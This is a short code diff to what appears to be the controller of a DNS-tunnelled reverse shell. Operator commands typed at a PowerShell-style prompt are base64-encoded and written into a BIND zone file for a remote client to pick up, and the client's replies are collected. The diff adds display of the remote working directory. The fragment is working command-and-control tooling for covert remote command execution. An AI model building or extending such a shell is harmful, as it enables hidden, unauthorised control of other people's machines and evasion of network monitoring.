@@ -101,8 +101,9 @@ preset = f"../bind/data/zones/revshell.{domain}.preset"
 
 command = ""
 counter = 0
+pwd = ""
 while(command != "exit"):
-    command = base64_encode_string(input("PS> "))
+    command = base64_encode_string(input(f"PS {pwd}>"))
 
     # send command to client
     zone = open(filename, "a")
@@ -117,6 +118,7 @@ while(command != "exit"):
 
     if(command != "exit"):
         # Get response from client
-        getData(code, counter)
+        pwd = getData(f"pwd-{code}", counter, True)
+        getData(f"{code}", counter)
 
     counter += 1
